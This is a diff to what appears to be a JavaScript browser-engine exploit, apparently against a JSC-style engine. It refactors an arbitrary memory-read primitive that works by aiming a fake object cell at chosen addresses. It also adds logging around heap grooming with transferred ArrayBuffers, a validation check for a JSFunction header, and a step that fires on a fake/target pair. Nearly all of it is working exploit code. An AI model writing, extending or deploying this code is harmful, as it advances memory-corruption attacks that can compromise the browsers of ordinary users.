@@ -66,6 +66,7 @@ const burstKey = `${REVISION}:burst`;
 const rwHeader = new Uint8Array(CELL_BYTES);
 const targetHeader = new Uint8Array(NATIVE_EXECUTABLE_BYTES);
 const holderHeader = new Uint8Array(HOLDER_BYTES);
+const probeHeader = new Uint8Array(0x20);
 const scratchBits = new ArrayBuffer(8);
 const scratchBytes = new Uint8Array(scratchBits);
 const scratchWords = new Uint32Array(scratchBits);
@@ -285,12 +286,29 @@ function encodedHeaderNumber() {
     return f64[0];
 }
 
-function looksLikeJSFunction(addr) {
+// Read 0x20 bytes at `addr` through `candidate` into `probeHeader`,
+// then restore the carrier. `candidate` must be the live fake cell.
+function probeMemoryAt(candidate, addr) {
     if (!plausibleAddress(addr) || addr % 8 !== 0) return false;
-    let blk;
-    try { blk = readBytesAt(addr, 0x20); }
-    catch (e) { console.warn("[core] looksLikeJSFunction read threw:", e); return false; }
+    try {
+        aimCarrier(candidate, addr);
+        readBytes(probeHeader, rwView, 0x20);
+        restoreCarrier(candidate);
+        return true;
+    } catch (e) {
+        console.warn("[core] probeMemoryAt threw:", e);
+        try { restoreCarrier(candidate); } catch (e2) { }
+        return false;
+    }
+}
 
+// Diagnostic only. Never gates the chain. Called with the live candidate
+// and the address we believe is a JSFunction.
+function looksLikeJSFunction(candidate, addr) {
+    if (!plausibleAddress(addr) || addr % 8 !== 0) return false;
+    if (!probeMemoryAt(candidate, addr)) return false;
+
+    const blk = probeHeader;
     const sid = blk[0] | (blk[1] << 8) | (blk[2] << 16) | (blk[3] << 24);
     if (sid < 0x100 || sid >= 0x08000000) return false;
     if (blk[4] !== 0) return false;
@@ -518,6 +536,7 @@ function resetAttemptState() {
     rwHeader.fill(0);
     targetHeader.fill(0);
     holderHeader.fill(0);
+    probeHeader.fill(0);
 }
 
 function startAttempt() {
@@ -882,7 +901,7 @@ function loadHistoryCritical() {
             return;
         }
 
-        if (!looksLikeJSFunction(nativeTargetAddress)) {
+        if (!looksLikeJSFunction(candidate, nativeTargetAddress)) {
             emit("FUNC-HEADER-WEAK",
                 `addr=${hex(nativeTargetAddress)}`
                 + `-bytes=${dumpHex(holderHeader, HOLDER_BYTES)}`);
@@ -1031,6 +1050,9 @@ function runGroomAndLoad() {
 
         let slab = buffer(SLAB_SIZE);
         channel.port1.postMessage(0, [slab]);
+        if (slab.byteLength !== 0) {
+            emit("TRANSFER-NOOP", "slab byteLength=" + slab.byteLength);
+        }
         slab = null;
 
         const butterflyHole1 = buffer(BUTTERFLY_HOLE_SIZE);
@@ -1052,6 +1074,14 @@ function runGroomAndLoad() {
 
         channel.port1.postMessage(0, [butterflyHole1, butterflyHole2,
             earlyHole, finalHole]);
+        if (butterflyHole1.byteLength !== 0 || butterflyHole2.byteLength !== 0
+            || earlyHole.byteLength !== 0 || finalHole.byteLength !== 0) {
+            emit("TRANSFER-NOOP-2",
+                "holes byteLength=" + butterflyHole1.byteLength
+                + "," + butterflyHole2.byteLength
+                + "," + earlyHole.byteLength
+                + "," + finalHole.byteLength);
+        }
 
         loadHistoryCritical();
     } catch (error) {
@@ -1080,6 +1110,10 @@ function ensureBarrierNode() {
 }
 
 function defaultCriticalBarrier(fake, target) {
+    emit("BARRIER-FIRED", "fake=" + hex(fake)
+        + " target=" + hex(target)
+        + " t=" + (typeof performance !== "undefined"
+                   ? performance.now().toFixed(1) : "?"));
     try {
         const line = `CRITICAL-LOAD-NEXT-fake=${hex(fake)}-target=${hex(target)}`;
         if (barrierNode !== null) {
